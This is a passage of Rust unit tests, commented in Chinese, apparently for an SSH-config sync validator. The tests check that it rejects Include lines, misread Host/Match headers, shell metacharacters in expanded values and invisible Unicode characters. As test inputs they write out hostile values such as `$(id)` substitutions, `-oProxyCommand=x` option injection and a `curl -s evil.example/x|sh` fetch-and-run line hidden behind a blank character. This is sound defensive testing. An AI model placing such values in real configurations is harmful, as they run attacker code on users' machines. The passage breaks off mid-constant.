        assert_eq!(forbidden_directive(&parse_file("# Include a.config\nHost web\n  User a\n").0), None);
        // 停用的 directive 序列化成註解:不算。production 裡 `enabled = false` 一定帶著 `dirty = true`
        // (`edit::set_directive_enabled`);序列化器只在兩者並存時才把那一行寫成註解。
        let (mut items, _) = parse_file("Host web\n  Include a.config\n");
        disable_first_body_directive(&mut items, true);
        assert_eq!(serialize_items(&items, true), "Host web\n  # Include a.config\n");
        assert_eq!(forbidden_directive(&items), None);
        // 只有 `enabled = false`、沒有 `dirty`:序列化器照樣把原本那一行(live)寫出來,所以要算。
        let (mut items, _) = parse_file("Host web\n  Include a.config\n");
        disable_first_body_directive(&mut items, false);
        assert_eq!(serialize_items(&items, true), "Host web\n  Include a.config\n");
        assert_eq!(forbidden_directive(&items), Some(Forbidden::Include));
    }

    /// 第一個 Host 區塊的第一行 directive 設成 `enabled = false`,`dirty` 由呼叫端指定。
    fn disable_first_body_directive(items: &mut [Item], dirty: bool) {
        if let Item::Host(h) = &mut items[0] {
            if let Item::Directive(d) = &mut h.body[0] {
                d.enabled = false;
                d.dirty = dirty;
            }
        }
    }

    #[test]
    fn forbidden_messages_name_the_problem_without_echoing_the_line() {
        // lexer 的 keyword 是「第一個空白或 `=` 之前」的原字串,可能夾著值(`HostName"10.1.2.3"`);錯誤訊息會
        // 進狀態列與 last_error,不能把 keyword 或整行印出來。
        for (text, phrase, secret) in [
            ("Host web\n  HostName\"10.1.2.3\"\n", "quoted keyword", "10.1.2.3"),
            ("Host web\n  IdentityFile\"/Users/me/.ssh/id_work\"\n", "quoted keyword", "id_work"),
            ("Host web\n  Proxy\"Command\"nc internal.example 22\n", "quoted keyword", "internal.example"),
            ("Host web\n  =IdentityFile /Users/me/.ssh/id_work\n", "starting with '='", "id_work"),
            ("Host web\n  Include /Users/me/.ssh/id_work.config\n", "Include", "id_work"),
            // 值有問題的那四個 keyword:訊息只說是哪個 keyword,絕不帶值。
            ("Host web\n  HostName \"secret-host.example$(id)\"\n", "a HostName value", "secret-host"),
            ("Host web\n  User \"corp\\jdoe\"\n", "a User value", "jdoe"),
            ("Host web\n  HostKeyAlias \"alias.internal'x\"\n", "a HostKeyAlias value", "alias.internal"),
            ("Host web\n  ProxyJump \"jump.internal;id\"\n", "a ProxyJump value", "jump.internal"),
            ("Host web\n  ForwardAgent no\u{a0}/Users/me/secret.sock\n", "non-ASCII space or control character", "secret.sock"),
            // 畫不出東西的字元與沒有基底字的記號:訊息一樣不帶那一行。
            ("Host web\n  ProxyCommand ssh -W %h:%p secret.example\u{3164}#$(id)\n", "invisible formatting character", "secret.example"),
            ("Host web\n  ProxyCommand ssh -W %h:%p secret.example;\u{301}#$(id)\n", "combining mark or symbol", "secret.example"),
        ] {
            let error = validate_host_text("web", text).expect_err(text).to_string();
            assert!(error.contains(phrase), "{error}");
            assert!(!error.contains(secret), "{error}");
        }
        // 接在 "contains " 後面讀起來是一句完整的話(B3 的訊息沿用同一個片語)。
        assert_eq!(
            validate_host_text("web", "Host web\n  Include x\n").unwrap_err().to_string(),
            "synced record for 'web' contains an Include line, which synced hosts cannot use"
        );
        assert_eq!(
            validate_host_text("web", "Host web\n  HostName \"a$(id)b\"\n").unwrap_err().to_string(),
            "synced record for 'web' contains a HostName value with characters ssh would pass to a shell, which synced hosts cannot use"
        );
        assert_eq!(
            validate_host_text("web", "Host web\n  ForwardAgent no\u{a0}\n").unwrap_err().to_string(),
            "synced record for 'web' contains a line with a non-ASCII space or control character, or an invisible formatting character (OpenSSH would read something other than what SSHelter shows), which synced hosts cannot use"
        );
        assert_eq!(
            validate_host_text("web", "Host web\n  ProxyCommand nc %h %p;\u{301}#x\n").unwrap_err().to_string(),
            "synced record for 'web' contains a command with a combining mark or symbol where a word starts (it could disguise where a shell comment begins), which synced hosts cannot use"
        );
    }

    /// Host / Match 那一行:OpenSSH 只在空格、tab 處分詞,`#` 要在一個詞的開頭才是註解;解析器卻把第一個不在雙引號裡的
    /// `#` 之後都當成註解。兩邊讀到的 pattern 不同的行一律拒絕(OpenSSH 10.3p1 `ssh -G` 實測:`Host web#x *` 讓不相干的
    /// 主機也套用這個區塊),OpenSSH 會讀的部分含引號或反斜線的也拒絕;真正的行尾註解照常可用。
    #[test]
    fn host_and_match_lines_must_read_the_same_to_openssh() {
        // 記錄:alias 是解析器看到的第一個 pattern。
        for (alias, text) in [
            ("web", "Host web#x *\n  HostName attacker.example.net\n  User root\n"),
            ("web", "Host web#x\n  User a\n"),
            ("web", "Host web# *\n  User a\n"),
            ("web", "Host web b#c\n  User a\n"),
            ("a", "Host a#b\n  User a\n"),
            ("web", "Host=web#x *\n  User a\n"),
            ("web", "HOST web#x *\n  User a\n"),
            ("web", "Host web#x *\r\n  User a\r\n"),
            ("web", "Host web 'x'\n  User a\n"),
            ("web", "Host web 'x y' # c\n  User a\n"),
            ("web", "Host web it's\n  User a\n"),
            ("web\\", "Host web\\ x\n  User a\n"),
        ] {
            let error = validate_host_text(alias, text).expect_err(text).to_string();
            assert!(error.contains("contains a Host line that OpenSSH reads differently from SSHelter"), "{text:?}: {error}");
            assert!(!error.contains("attacker") && !error.contains('#'), "the line is never echoed: {error}");
            let (mut items, _) = parse_file("Host db\n");
            assert!(apply_host_text(&mut items, alias, text).is_err(), "{text:?}");
            assert_eq!(forbidden_directive(&parse_file(text).0), Some(Forbidden::MisreadHeader("Host")), "{text:?}");
        }
        // 引號與反斜線:解析器的 pattern 帶著它們,OpenSSH 拿掉引號、處理跳脫(`"web *"` 是一個含空白的 pattern)。
        // 記錄會先被 wildcard 的規則擋下;同步的檔案走的是同一個函式。
        for text in ["Host \"web *\"\n", "Host \"web\"\n", "Host web\\ x\n", "Host w\\eb\n"] {
            assert_eq!(forbidden_directive(&parse_file(text).0), Some(Forbidden::MisreadHeader("Host")), "{text:?}");
        }
        // 真正的行尾註解(`#` 在詞的開頭)兩邊讀起來一樣,照常可用;註解裡的引號與反斜線 OpenSSH 不讀,也不影響。
        for (alias, text) in [
            ("web", "Host web\n  User a\n"),
            ("a", "Host a b\n  User a\n"),
            ("web", "Host web # comment\n  User a\n"),
            ("a", "Host a b # c\n  User a\n"),
            ("web", "Host web\t#x *\n  User a\n"),
            ("web", "Host web #x\n  User a\n"),
            ("web", "Host web #\n  User a\n"),
            ("web", "Host web # Frank's laptop \"main\" C:\\keys\n  User a\n"),
            ("web", "Host=web # c\n  User a\n"),
            ("web", "Host = web web.example.com\n  User a\n"),
            ("web", "Host web \t\n  User a\n"),
            ("web", "Host web\r\n  User a\r\n"),
            ("web", "Host web # c\r\n  User a\r\n"),
        ] {
            validate_host_text(alias, text).unwrap_or_else(|e| panic!("{text:?}: {e}"));
        }
        // wildcard 仍由「wildcard 區塊不同步」那條規則擋(記錄);pattern 本身兩邊讀起來一樣,這條規則不管。
        assert_eq!(forbidden_directive(&parse_file("Host *.example.com\n  User a\n").0), None);
        assert!(validate_host_text("*.example.com", "Host *.example.com\n").is_err());
        // 同步的檔案:Match 那一行也一樣(`Match host web#x,*` 讓每一台主機都符合;`Match exec "…"` 含引號)。
        assert_eq!(
            forbidden_directive(&parse_file("Host web\nMatch host web#x,*\n  User root\n").0),
            Some(Forbidden::MisreadHeader("Match"))
        );
        assert_eq!(forbidden_directive(&parse_file("Match exec \"true\"\n  User root\n").0), Some(Forbidden::MisreadHeader("Match")));
        assert_eq!(forbidden_directive(&parse_file("Host a\nHost web#x *\n  User root\n").0), Some(Forbidden::MisreadHeader("Host")));
        assert_eq!(forbidden_directive(&parse_file("Match host web # c\n  User a\nMatch all\n").0), None);
    }

    /// ssh 把 `HostName`(`%h`)、`User`(`%r`)、`HostKeyAlias`(`%k`)、`ProxyJump`(`%j`)的值原樣、不加引號也不跳脫地展開進
    /// `ProxyCommand` / `LocalCommand` / `KnownHostsCommand`,以及 `ProxyJump` 隱含的 `ssh -W '[%h]:%p'` 指令。ssh 只在
    /// 命令列上擋 shell 字元(`ssh -G 'a$(id)b'` → hostname contains invalid characters),設定檔讀進來的值不擋 —— 所以
    /// 這四個 keyword 的值必須是恰好一個、不含 shell 字元的詞。
    #[test]
    fn values_that_ssh_expands_into_commands_must_be_one_plain_word() {
        for text in [
            // 審查者在 OpenSSH 10.3p1 實測會執行的三種:`%h`、`%r` 進 ProxyCommand;單引號跳脫進 ProxyJump 隱含的指令。
            "Host web\n  HostName \"a$(echo X >&2)b\"\n  ProxyCommand true %h\n",
            "Host web\n  User \"u$(echo X >&2)\"\n  ProxyCommand true %r\n",
            "Host web\n  HostName \"x'$(echo X >&2)'y\"\n  ProxyJump 127.0.0.1:9\n",
            // `#` 黏在值後面不是註解(OpenSSH 的 `#` 只在詞的開頭才是),整段都是值。
            "Host web\n  HostName example.com#$(id)\n",
            "Host web\n  User deploy#`id`\n",
            // 不是恰好一個詞:兩個詞、沒有值;開頭的 `-` 會被當成選項。
            "Host web\n  HostName a b\n",
            "Host web\n  User first last\n",
            "Host web\n  ProxyJump a, b\n",
            "Host web\n  HostName\n",
            "Host web\n  HostName # nothing but a comment\n",
            "Host web\n  HostName -oProxyCommand=x\n",
            "Host web\n  User -x\n",
            "Host web\n  ProxyJump -oProxyCommand=x\n",
            // ProxyJump 的每一個 hop(逗號之後)與它的主機部分(`@` 之後、`[` 之後、`ssh://` 之後)也一樣:ssh 把主機接在隱含的
            // `ssh -W` 指令最後,以 `-` 開頭就會被讀成選項。
            "Host web\n  ProxyJump bastion,-oProxyCommand=x\n",
            "Host web\n  ProxyJump a,-x,b\n",
            "Host web\n  ProxyJump u@-oProxyCommand=x\n",
            "Host web\n  ProxyJump bastion,u@-x:22\n",
            "Host web\n  ProxyJump [-x]:22\n",
            "Host web\n  ProxyJump u@[-x]:22\n",
            "Host web\n  ProxyJump ssh://-x@jump:22\n",
        ] {
            let items = parse_file(text).0;
            assert!(matches!(forbidden_directive(&items), Some(Forbidden::UnsafeValue(_))), "{text:?}");
            let error = validate_host_text("web", text).expect_err(text).to_string();
            assert!(error.contains("characters ssh would pass to a shell"), "{text:?}: {error}");
        }
        // 值裡的控制字元(C1 的 U+0090):`is_invisible` 擋所有的控制字元,而 `forbidden` 先查看不見的字元、才查值的規則,所以是 `InvisibleCharacter`;
        // `is_plain_shell_bound_value` 自己的 `is_control` 檢查成了第二道防線。
        assert_eq!(forbidden_directive(&parse_file("Host web\n  HostName a\u{90}b\n").0), Some(Forbidden::InvisibleCharacter));
        // 四個 keyword × 每一個字元(ssh 自己對命令列主機名稱擋的那一組,去掉逗號 —— ProxyJump 的清單要用逗號)。
        for (keyword, name) in [("HostName", "HostName"), ("User", "User"), ("HostKeyAlias", "HostKeyAlias"), ("ProxyJump", "ProxyJump")] {
            for c in ['\'', '`', '"', '$', '\\', ';', '&', '<', '>', '|', '(', ')', '{', '}'] {
                let items = parse_file(&format!("Host web\n  {keyword} a{c}b\n")).0;
                assert_eq!(forbidden_directive(&items), Some(Forbidden::UnsafeValue(name)), "{keyword} with {c:?}");
            }
        }
        // 同步的檔案整個都查:top-level 與 Match 區塊裡的也一樣(全域的 `HostName` 對每一台主機都生效)。
        assert_eq!(forbidden_directive(&parse_file("User \"x$(id)\"\nHost web\n").0), Some(Forbidden::UnsafeValue("User")));
        assert_eq!(
            forbidden_directive(&parse_file("Host web\nMatch all\n  ProxyJump \"a'b\"\n").0),
            Some(Forbidden::UnsafeValue("ProxyJump"))
        );
        // 停用的行只有在「寫成註解」時才不算(`Directive::serializes_as_comment`);沒有 dirty 的照 raw 寫出,仍是生效的一行。
        let (mut items, _) = parse_file("Host web\n  HostName \"a$(id)b\"\n");
        disable_first_body_directive(&mut items, false);
        assert_eq!(forbidden_directive(&items), Some(Forbidden::UnsafeValue("HostName")));
        disable_first_body_directive(&mut items, true);
        assert_eq!(forbidden_directive(&items), None);
    }

    /// 上一個測試的另一面:ssh 讀得進去的正常寫法(都用 `ssh -G -F` 對 OpenSSH 10.3p1 確認過)不能誤擋。
    #[test]
    fn ordinary_values_of_those_keywords_stay_accepted() {
        for text in [
            "Host web\n  HostName 10.0.0.5\n",
            "Host web\n  HostName %h.example.com\n",
            // ssh 自己要求設定檔裡的 `%` 寫成 `%%`(HostName 會做 percent 展開);單個 `%` ssh 會拒絕,但那不是 shell 的問題,
            // 我們的規則不擋 `%`。
            "Host web\n  HostName fe80::1%%en0\n",
            "Host web\n  HostName fe80::1%en0\n",
            "Host web\n  HostName=10.0.0.5\n",
            "Host web\n  HostName = 10.0.0.5\n",
            "Host web\n  HostName\t10.0.0.5\n",
            "Host web\n  User deploy\n",
            "Host web\n  User first.last@corp.example\n",
            "Host web\n  HostKeyAlias web.internal\n",
            "Host web\n  ProxyJump bastion,user@jump:2222\n",
            "Host web\n  ProxyJump ssh://user@jump:2222\n",
            "Host web\n  ProxyJump none\n",
            // hop 與主機名稱中間的 `-` 沒問題。
            "Host web\n  ProxyJump user-name@jump-1:2222,ssh://u-2@jump-2:22,[fe80::1]:22\n",
            // 行尾註解:`#` 在詞的開頭才是註解,後面的內容完全不看。
            "Host web\n  HostName 10.0.0.5 # office\n",
            "Host web\n  HostName 10.0.0.5\t#office\n",
            "Host web\n  User deploy #$(not a command) 'x'\n",
            // 非 ASCII 的名稱沒問題。
            "Host web\n  HostName 例え.jp # 備註\n",
            // 只管這四個 keyword;別的 keyword 的值照舊(引號、空白都可以)。
            "Host web\n  IdentityFile \"~/.ssh/id work\"\n  SetEnv A=\"b c\"\n  ProxyCommand sh -c \"nc %h %p\"\n",
            // 註解掉的那行不生效,不看。
            "Host web\n  # HostName \"a$(id)b\"\n",
            // CRLF:行尾的 CR 不是值的一部分。
            "Host web\r\n  HostName 10.0.0.5\r\n  User deploy # note\r\n  ProxyJump bastion\r\n",
        ] {
            validate_host_text("web", text).unwrap_or_else(|e| panic!("{text:?}: {e}"));
        }
    }

    /// OpenSSH 只在空格、tab、CR、LF 處斷詞;解析器卻用 `char::is_whitespace`(去前後空白、吃分隔符),把非 ASCII 的空白
    /// 悄悄吃掉:`ForwardAgent no<U+00A0>` 的簽章和已核准的 `ForwardAgent no` 一樣,ssh 讀到的卻是另一個值(`no<U+00A0>`
    /// 是 socket 路徑,代表轉送開著);`ProxyCommand <U+00A0>nc %h 22` 執行的指令名稱是 `<U+00A0>nc`。
    #[test]
    fn non_ascii_spaces_and_control_characters_are_refused_but_crlf_and_tabs_are_not() {
        for text in ["Host web\n  ForwardAgent no\u{a0}\n", "Host web\n  ProxyCommand \u{a0}nc %h 22\n"] {
            let error = validate_host_text("web", text).expect_err(text).to_string();
            assert!(error.contains("non-ASCII space or control character"), "{text:?}: {error}");
            let (mut items, _) = parse_file("Host db\n");
            assert!(apply_host_text(&mut items, "web", text).is_err(), "{text:?}");
        }
        // 清單上的每一個字元,放在行裡的五個位置:行尾、分隔符之後、值的中間、`#` 黏在詞中間(不是註解)之後、縮排。
        let spaces = [
            '\u{85}', '\u{a0}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2002}', '\u{2003}', '\u{2004}', '\u{2005}', '\u{2006}',
            '\u{2007}', '\u{2008}', '\u{2009}', '\u{200a}', '\u{2028}', '\u{2029}', '\u{202f}', '\u{205f}', '\u{3000}', '\u{feff}',
        ];
        for c in spaces {
            for text in [
                format!("Host web\n  ForwardAgent no{c}\n"),
                format!("Host web\n  ProxyCommand {c}nc %h 22\n"),
                format!("Host web\n  ProxyCommand nc{c}%h 22\n"),
                format!("Host web\n  HostName 10.0.0.5#a{c}b\n"),
                format!("Host web\n  {c}ForwardAgent no\n"),
                format!("Host web{c}\n  User a\n"), // Host 那一行本身:ssh 的 pattern 帶著這個字元,解析器的 pattern 沒有
            ] {
                let items = parse_file(&text).0;
                assert_eq!(forbidden_directive(&items), Some(Forbidden::InvisibleCharacter), "{text:?}");
            }
        }
        // 檔案開頭的 BOM:那一行的 keyword 帶著 U+FEFF,不是 `Host`,整個檔案的區塊結構就被悄悄改了。
        assert_eq!(forbidden_directive(&parse_file("\u{feff}Host web\n  User a\n").0), Some(Forbidden::InvisibleCharacter));
        // ASCII 控制字元(tab 除外):放在行中間、行尾都擋。CR 只有在行尾(換行之前)才是換行的一部分,行中間的要擋。
        for c in ['\u{0}', '\u{1}', '\u{b}', '\u{c}', '\u{1b}', '\u{7f}'] {
            for text in [format!("Host web\n  ForwardAgent no{c}yes\n"), format!("Host web\n  ForwardAgent no {c}\n")] {
                assert_eq!(forbidden_directive(&parse_file(&text).0), Some(Forbidden::InvisibleCharacter), "{text:?}");
            }
        }
        assert_eq!(forbidden_directive(&parse_file("Host web\n  ForwardAgent no\ryes\n").0), Some(Forbidden::InvisibleCharacter));
        // 放在 top-level 與 Match 區塊裡的也要抓到。
        assert_eq!(forbidden_directive(&parse_file("ForwardAgent no\u{a0}\nHost web\n").0), Some(Forbidden::InvisibleCharacter));
        assert_eq!(
            forbidden_directive(&parse_file("Host web\nMatch all\n  ForwardAgent no\u{a0}\n").0),
            Some(Forbidden::InvisibleCharacter)
        );
        // Match 那一行本身也是(同步的檔案允許 Match 區塊;記錄不允許,但檔案檢查走同一個函式)。
        assert_eq!(forbidden_directive(&parse_file("Host web\nMatch all\u{a0}\n  User a\n").0), Some(Forbidden::InvisibleCharacter));
        // 不能誤擋:tab、CRLF(`\n` 之前的那一個 CR 是換行的一部分;lexer 以 `\n` 切行,CR 留在 raw 的行尾 ——
        // 沒有行尾註解時在 `trailing_ws`,有註解時在註解的結尾,沒有值時在分隔符)、非 ASCII 的一般文字與註解。
        for text in [
            "Host web\n\tUser\tbob\n\tForwardAgent\tno\n",
            "Host web\r\n  HostName 10.0.0.5\r\n  ProxyCommand nc %h 22 # via bastion\r\n  User bob\r\n  # note\r\n\r\n",
            "Host web\r\n  ForwardAgent no\r\n",
            "Host web\n  HostName 例え.jp # 備註\n  # note\u{a0}here\n",
        ] {
            validate_host_text("web", text).unwrap_or_else(|e| panic!("{text:?}: {e}"));
            let (mut items, _) = parse_file("Host db\n");
            assert!(apply_host_text(&mut items, "web", text).unwrap(), "{text:?}");
        }
        // 第二個 CR 不是換行的一部分。
        assert_eq!(forbidden_directive(&parse_file("Host web\r\r\n  User a\n").0), Some(Forbidden::InvisibleCharacter));
    }

    /// 只看 OpenSSH 會讀的部分:它當成註解的部分(一個詞開頭的 `#` 之後,不在引號裡)ssh 不讀,裡面的全形空白、雙向與零寬
    /// 字元照常可用;值、`#` 黏在詞中間或在引號裡、整段原樣使用的 `ProxyCommand` 等、空行與整行註解的縮排一律擋。雙向與
    /// 零寬字元(U+061C、U+200B–U+200F、U+202A–U+202E、U+2060、U+2066–U+2069)會讓核准對話框顯示的文字和 ssh 讀到的不同。預設不顯示的字元
    /// (`Default_Ignorable_Code_Point`)、設計上就是空白的字元(`hidden`)、其餘的 Cf 格式字元(`other_formats`)與 C0、DEL、C1 的控制字元(`controls`)一樣:註解裡照常可用,其他位置一律擋。
    #[test]
    fn invisible_characters_are_refused_except_in_what_openssh_reads_as_a_comment() {
        let spaces = ['\u{85}', '\u{a0}', '\u{1680}', '\u{2000}', '\u{200a}', '\u{2028}', '\u{202f}', '\u{205f}', '\u{3000}', '\u{feff}'];
        let formats = [
            '\u{61c}', '\u{200b}', '\u{200c}', '\u{200d}', '\u{200e}', '\u{200f}', '\u{202a}', '\u{202b}', '\u{202c}', '\u{202d}', '\u{202e}',
            '\u{2060}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
        ];
        // 韓文填充字、組合字元連接符、變體選擇符、點字空白、樂譜空符頭、埃及象形文字空白、標籤字元 ……(各範圍的頭尾與常見的幾個)。
        let hidden = [
            '\u{ad}', '\u{34f}', '\u{115f}', '\u{1160}', '\u{17b4}', '\u{180b}', '\u{2065}', '\u{3164}', '\u{fe0f}', '\u{ffa0}', '\u{fff0}', '\u{1bca0}',
            '\u{1d159}', '\u{1d173}', '\u{2800}', '\u{13441}', '\u{13442}', '\u{303f}', '\u{e0001}', '\u{e0100}', '\u{e0fff}',
        ];
        // Cf(General_Category=Format)裡不在 Default_Ignorable 的字元:阿拉伯文的數字記號與句末記號、敘利亞文的縮寫記號、阿拉伯文的貨幣記號、行間註記、卡提文的數字記號、
        // 埃及象形文字的格式控制(各範圍的頭尾與常見的幾個)。
        let other_formats = [
            '\u{600}', '\u{605}', '\u{6dd}', '\u{70f}', '\u{890}', '\u{891}', '\u{8e2}', '\u{fff9}', '\u{fffb}', '\u{110bd}', '\u{110cd}', '\u{13430}', '\u{1343f}',
        ];
        // C0、DEL 與 C1 的控制字元(C1 不是 ASCII,`is_ascii_control` 管不到)。
        let controls = ['\u{1}', '\u{b}', '\u{c}', '\u{1b}', '\u{7f}', '\u{80}', '\u{84}', '\u{86}', '\u{9f}'];
        for c in spaces.into_iter().chain(formats).chain(other_formats).chain(hidden).chain(controls) {
            for text in [
                format!("Host web\n  HostName 10.0.0.5 # a{c}b\n"),
                format!("Host web # 辦公室{c}主機\n  User a\n"),
                format!("Host web\n  # note{c}here\n  User a\n"),
                format!("Host web\n  ForwardAgent yes\t#{c}\n"),
                format!("Host web\n  IdentityFile \"~/.ssh/id work\" # a{c}b\n"),
                format!("Match all # a{c}b\n  User a\n"),
            ] {
                assert_eq!(forbidden_directive(&parse_file(&text).0), None, "{text:?}");
            }
            for text in [
                format!("Host web\n  ForwardAgent no{c}\n"),
                format!("Host web\n  HostName 10.0.0.5#a{c}b\n"),
                format!("Host web\n  IdentityFile \"~/.ssh/id # a{c}b\"\n"),
                format!("Host web\n  ProxyCommand nc %h 22 # a{c}b\n"),
                format!("Host web\n  LocalCommand echo done # a{c}b\n"),
                format!("Host web\n  RemoteCommand tmux attach # a{c}b\n"),
                format!("Host web\n  KnownHostsCommand /usr/bin/true # a{c}b\n"),
                format!("Host web\n  VersionAddendum none # a{c}b\n"),
                format!("Host web{c} # c\n  User a\n"),
                format!("Host web\n  {c}\n  User a\n"),
                format!("Host web\n  {c}# note\n  User a\n"),
                format!("{c}\nHost web\n"),
            ] {
                assert_eq!(forbidden_directive(&parse_file(&text).0), Some(Forbidden::InvisibleCharacter), "{text:?}");
            }
        }
        // 記錄層:註解裡的全形空白照常同步;雙向字元放在值裡就拒絕,訊息不回顯那一行。
        validate_host_text("web", "Host web # 辦公室\u{3000}主機\n  HostName 10.0.0.5 # 公司\u{3000}VPN\n  # 備註\u{3000}x\n").unwrap();
        let error = validate_host_text("web", "Host web\n  HostName 10.0.0.5\n  IdentityFile ~/.ssh/\u{202e}krow_di\n").unwrap_err().to_string();
        assert!(error.contains("invisible formatting character") && !error.contains("krow"), "{error}");
        // NBSP 自己一行(解析器當成空行):OpenSSH 把它當成一個不認得的 keyword,整份設定讀不進去。
        assert!(validate_host_text("web", "Host web\n  User a\n\u{a0}\n").is_err());
        assert!(validate_host_text("web", "Host web\n  User a\n \t\n\r\n").is_ok());
    }

    /// 記錄(`validate_host_text`、`apply_host_text`)與同步的檔案(`check_managed_items`)兩個層次都拒絕這段文字:`forbidden_directive` 給的是 `expected`,
    /// 訊息含 `phrase` 與 "which synced hosts cannot use",而且不回顯 `secrets` 的任何一段(訊息會進狀態列與 `last_error`)。
    fn assert_refused_everywhere(text: &str, expected: Forbidden, phrase: &str, secrets: &[&str]) {
        assert_eq!(forbidden_directive(&parse_file(text).0), Some(expected), "{text:?}");
        let record = validate_host_text("web", text).expect_err(text).to_string();
        let file = check_managed_items(&parse_file(text).0).expect_err(text).to_string();
        for message in [&record, &file] {
            assert!(message.contains(phrase) && message.contains("which synced hosts cannot use"), "{text:?}: {message}");
            for secret in secrets {
                assert!(!message.contains(*secret), "{text:?} is echoed in: {message}");
            }
        }
        let (mut items, _) = parse_file("Host db\n");
        assert!(apply_host_text(&mut items, "web", text).is_err(), "{text:?}");
    }

    /// 兩個層次都接受這段文字(記錄套得上去、同步的檔案過得了檢查)。
    fn assert_accepted_everywhere(text: &str) {
        validate_host_text("web", text).unwrap_or_else(|e| panic!("{text:?}: {e}"));
        check_managed_items(&parse_file(text).0).unwrap_or_else(|e| panic!("{text:?}: {e}"));
        let (mut items, _) = parse_file("Host db\n");
        assert!(apply_host_text(&mut items, "web", text).unwrap(), "{text:?}");
    }

    /// `bastion<U+3164>#$(…)`:韓文填充字(以及整類畫不出東西的字元)讓 `#` 看起來像前面有空白的註解開頭,shell 卻把 `#` 當成詞中間的字元、照樣執行 `$(…)`
    /// (`/bin/sh -c 'echo bastion<U+3164>#$(echo X)'` 印出 `bastion<U+3164>#X`)。記錄與同步的檔案兩個層次都要擋;整行交給 shell 的五個 keyword 一樣。
    #[test]
    fn letters_that_draw_nothing_cannot_make_a_shell_command_look_like_a_comment() {
        // 審查指出的(U+3164、U+115F、U+FFA0、U+034F、U+FE0F、U+180B、U+2800、U+1D159、U+13441、U+13442、U+E0100)、表意文字的半形填充空白 U+303F,
        // 以及其餘各範圍的頭尾。
        let hidden = [
            '\u{3164}', '\u{115f}', '\u{ffa0}', '\u{34f}', '\u{fe0f}', '\u{180b}', '\u{2800}', '\u{1d159}', '\u{13441}', '\u{13442}', '\u{e0100}',
            '\u{ad}', '\u{1160}', '\u{17b4}', '\u{17b5}', '\u{180f}', '\u{2065}', '\u{206f}', '\u{fe00}', '\u{fff0}', '\u{fff8}', '\u{1bca0}',
            '\u{1bca3}', '\u{1d173}', '\u{1d17a}', '\u{e0000}', '\u{e0001}', '\u{e007f}', '\u{e01ef}', '\u{e0fff}', '\u{303f}',
        ];
        for c in hidden {
            let shown = c.to_string();
            for keyword in ["ProxyCommand", "LocalCommand", "RemoteCommand", "KnownHostsCommand", "VersionAddendum"] {
                let text = format!("Host web\n  {keyword} ssh -W %h:%p bastion{c}#$(curl -s evil.example/x|sh)\n");
                let secrets = ["bastion", "evil.example", "curl", shown.as_str()];
                assert_refused_everywhere(&text, Forbidden::InvisibleCharacter, "invisible formatting character", &secrets);
            }
        }
    }

    /// Unicode 發布的 `Default_Ignorable_Code_Point`(DerivedCoreProperties.txt;Unicode 16.0.0 與 17.0.0 的清單一模一樣,17 段)。這份清單是照發布的範圍另外寫的,
    /// 不是從實作算出來的 —— 抄錯一個端點(`U+180B–U+180F` 寫成 `U+180B–U+180E`)就會在下面的測試現形。
    const PUBLISHED_DEFAULT_IGNORABLE: [(char, char); 17] = [
        ('\u{00ad}', '\u{00ad}'),
        ('\u{034f}', '\u{034f}'),
        ('\u{061c}', '\u{061c}'),
        ('\u{115f}', '\u{1160}'),
        ('\u{17b4}', '\u{17b5}'),
        ('\u{180b}', '\u{180f}'),
        ('\u{200b}', '\u{200f}'),
        ('\u{202a}', '\u{202e}'),
        ('\u{2060}', '\u{206f}'),
        ('\u{3164}', '\u{3164}'),
        ('\u{fe00}', '\u{fe0f}'),
        ('\u{feff}', '\u{feff}'),
        ('\u{ffa0}', '\u{ffa0}'),
        ('\u{fff0}', '\u{fff8}'),
        ('\u{1bca0}', '\u{1bca3}'),
        ('\u{1d173}', '\u{1d17a}'),
        ('\u{e0000}', '\u{e0fff}'),
    ];

    /// 設計上就是空白、卻不在 `Default_Ignorable_Code_Point` 裡的字元(`is_blank_by_design`):點字的空白、樂譜的空符頭、埃及象形文字的全空白與半空白、表意文字的半形填充空白。
    const PUBLISHED_BLANK_BY_DESIGN: [char; 5] = ['\u{2800}', '\u{1d159}', '\u{13441}', '\u{13442}', '\u{303f}'];

    /// 實作的範圍與 Unicode 發布的 `Default_Ignorable_Code_Point` 一個字元一個字元相同(`PUBLISHED_DEFAULT_IGNORABLE`)。
    #[test]
    fn the_hidden_character_ranges_are_exactly_the_published_unicode_ones() {
        for code_point in 0..=0x10ffff_u32 {
            let Some(c) = char::from_u32(code_point) else { continue };
            let published = PUBLISHED_DEFAULT_IGNORABLE.iter().any(|&(first, last)| (first..=last).contains(&c));
            assert_eq!(is_default_ignorable(c), published, "U+{code_point:04X}");
            assert_eq!(is_blank_by_design(c), PUBLISHED_BLANK_BY_DESIGN.contains(&c), "U+{code_point:04X}");
            // 原本就擋的類別(空白、雙向與零寬、控制字元)只會讓 `is_invisible` 更寬,不會更窄。
            if published || PUBLISHED_BLANK_BY_DESIGN.contains(&c) {
                assert!(is_invisible(c), "U+{code_point:04X}");
            }
        }
    }

    /// Unicode 發布的 General_Category=Cf(Format)清單,21 段、170 個碼位:Unicode 16.0.0(regex-syntax 0.8.10 的 `unicode_tables/general_category.rs` 的 `FORMAT` 表、Python 3.14 的
    /// `unicodedata`)與 17.0(Node 24.21.0、ICU 78.3 的 `\p{Cf}`)一模一樣。照發布的範圍另外寫,不是從實作算出來的。
    const PUBLISHED_FORMAT: [(char, char); 21] = [
        ('\u{00ad}', '\u{00ad}'),
        ('\u{0600}', '\u{0605}'),
        ('\u{061c}', '\u{061c}'),
        ('\u{06dd}', '\u{06dd}'),
        ('\u{070f}', '\u{070f}'),
        ('\u{0890}', '\u{0891}'),
        ('\u{08e2}', '\u{08e2}'),
        ('\u{180e}', '\u{180e}'),
        ('\u{200b}', '\u{200f}'),
        ('\u{202a}', '\u{202e}'),
        ('\u{2060}', '\u{2064}'),
        ('\u{2066}', '\u{206f}'),
        ('\u{feff}', '\u{feff}'),
        ('\u{fff9}', '\u{fffb}'),
        ('\u{110bd}', '\u{110bd}'),
        ('\u{110cd}', '\u{110cd}'),
        ('\u{13430}', '\u{1343f}'),
        ('\u{1bca0}', '\u{1bca3}'),
        ('\u{1d173}', '\u{1d17a}'),
        ('\u{e0001}', '\u{e0001}'),
        ('\u{e0020}', '\u{e007f}'),
    ];

    /// PropList.txt 的 White_Space 去掉 ASCII 的部分(解析器當成空白、OpenSSH 不當成空白的字元),再加上 BOM(U+FEFF,它不是空白,但同樣看不見)。
    const PUBLISHED_NON_ASCII_SPACES: [(char, char); 9] = [
        ('\u{0085}', '\u{0085}'),
        ('\u{00a0}', '\u{00a0}'),
